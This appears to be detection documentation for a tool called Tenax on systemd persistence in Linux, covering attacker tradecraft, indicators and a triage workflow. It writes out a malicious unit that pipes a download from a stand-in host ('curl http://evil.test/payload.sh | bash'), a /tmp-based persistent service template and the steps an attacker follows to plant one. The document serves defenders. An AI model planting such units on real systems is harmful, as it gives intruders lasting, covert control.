# Systemd Persistence

## Overview

Systemd is the dominant service manager and initialization system on modern Linux distributions. It is responsible for orchestrating system startup, managing long-running services, and handling dependencies between system components.

Because of its central role in system execution, systemd represents one of the most powerful and reliable persistence mechanisms available to an adversary.

> **If an attacker can control systemd, they can control what executes on boot, under which privileges, and under what conditions.**

---

## Why Attackers Use Systemd for Persistence

Systemd provides adversaries with:

- Guaranteed execution at boot  
- Fine-grained control over execution conditions  
- Integration with legitimate system services  
- High survivability across reboots  
- Execution as root or privileged service accounts  

Unlike simpler mechanisms such as cron, systemd allows attackers to embed persistence into what appears to be legitimate system functionality.

---

## Execution Semantics

Systemd operates through unit files, typically located in:

- `/etc/systemd/system/` (administrator-defined)
- `/lib/systemd/system/` or `/usr/lib/systemd/system/` (package-managed)

Each unit defines:
- What to execute (`ExecStart`)
- When to execute (`WantedBy`, `After`, `Before`)
- How to execute (user, restart policy, environment)

### Key Execution Properties

- Boot-triggered execution via targets such as:
  - `multi-user.target`
  - `graphical.target`

- Automatic restart behavior:
  - `Restart=always`
  - `Restart=on-failure`

- Execution context:
  - Root (default for system units)
  - Specific users via `User=`

---

## Privilege Requirements

- Writing to `/etc/systemd/system/` requires root privileges  
- User-level persistence is possible via:
  - `~/.config/systemd/user/`

However, most high-value persistence involves system-level units.

---

## Common Attacker Tradecraft

### 1. Malicious Service Creation

Example service:

```
[Service]
ExecStart=/tmp/update.sh
Restart=always
```

Why this works:
- `/tmp` is rarely expected for persistent binaries  
- Restart ensures continued execution  

---

### 2. Masquerading as Legitimate Services

Examples:
- `dbus-update.service`  
- `systemd-helper.service`  

Goal:
Blend into normal system services to evade detection.

---

### 3. Embedding Network Execution Chains

Example:

```
ExecStart=/bin/bash -c "curl http://evil.test/payload.sh | bash"
```

Why attackers use this:
- Minimal on-disk footprint  
- Payload can be rotated remotely  
- Avoids static detection  

---

### 4. Modifying Existing Services

Instead of creating new units, attackers may:

- Alter `ExecStart` in legitimate services  
- Add secondary execution lines  
- Inject environment variables  

Advantage:
Lower visibility compared to creating new services.

---

### 5. Persistence via User Services

Path:

```
~/.config/systemd/user/
```

- Executes on user login  
- Requires no root privileges  
- Useful for lower-privilege persistence  

---

## What Normal Looks Like

Legitimate systemd usage typically involves:

- Services located in `/lib/systemd/system/`  
- Packaged user units located in `/usr/lib/systemd/user/`  
- Execution of binaries in:
  - `/usr/bin/`  
  - `/usr/sbin/`  
  - `/usr/libexec/`  
  - other package-managed system locations such as `/usr/lib/`  
- Descriptive and well-documented unit names  
- No inline shell execution  

Example:

```
ExecStart=/usr/sbin/sshd -D
```

---

## What Malicious Use Looks Like

### High-Signal Indicators

- Execution from:
  - `/tmp`  
  - `/dev/shm`  
  - `/var/tmp`  
- Inline shell execution (`bash -c`, `sh -c`)  
- Network retrieval and execution (`curl`, `wget`)  
- Obfuscated commands (base64 decoding)  
- Unusual restart policies (`Restart=always` for non-daemon tasks)  

### Medium-Signal Indicators

- Newly created services in `/etc/systemd/system/`  
- Unusual service names mimicking legitimate components  
- Execution of scripts instead of binaries  

### Low-Signal Indicators

- Custom services for legitimate admin automation  
- Development or testing services  
- Benign maintenance commands such as tightening log permissions (`chmod 0640 /var/log/...`) without other suspicious context  

---

## ATT&CK Mapping

- **T1543 – Create or Modify System Process**  
- **T1543.002 – Systemd Service**  

Systemd persistence fits squarely within adversary behavior involving:
- Service creation  
- Service modification  
- Privileged process control  

---

## Procedure Examples (Tradecraft)

Systemd persistence is commonly implemented as:

```
systemctl enable <service>
systemctl start <service>
```

Typical attacker flow:
1. Drop payload (e.g., `/tmp/update.sh`)  
2. Create systemd service pointing to payload  
3. Enable service for persistence  
4. Start service for immediate execution  

---

## Analytical Guidance

### Key Question

> Does this service execute something that should exist on this system?

---

### Focus Areas

1. Execution Path  
   - Is the binary in a standard location?  
   - Is it writable by non-root users?  

2. Execution Method  
   - Direct binary execution vs shell wrapper  
   - Presence of command chaining  

3. Service Name  
   - Does it mimic legitimate services?  
   - Is it generic or slightly off?  

4. Creation Time  
   - Does it align with system install or updates?  

5. Parent Activity  
   - Package manager  
   - Administrator  
   - Unknown process  

---

## Triage Workflow

1. Identify suspicious unit file  

2. Inspect:
```
systemctl cat <service>
```

3. Validate:
- `ExecStart`  
- `User`  
- `Restart`  

4. Check metadata:
```
stat /etc/systemd/system/<service>
```

5. Review logs:
```
journalctl -u <service>
```

6. Validate referenced binary/script  

---

## Evidence to Preserve

- Unit file contents  
- Referenced scripts or binaries  
- System logs (`journalctl`)  
- File metadata (timestamps, ownership)  
- Network activity (if present)  

---

## False Positive Reduction

To reduce false positives:

- Correlate with package installation history  
- Validate against known system services  
- Confirm expected service behavior  
- Cross-check with system owner if needed  

---

## Why Tenax Checks This Surface

Systemd provides:

- High-reliability execution  
- Privileged execution contexts  
- Deep integration into system lifecycle  

It is one of the highest-value persistence mechanisms on Linux.

> A malicious systemd unit is rarely accidental. It is almost always intentional.

---

## Key Takeaway

Systemd persistence is powerful because it blends into core operating system behavior.

> The attacker does not hide from the system — they become part of it.


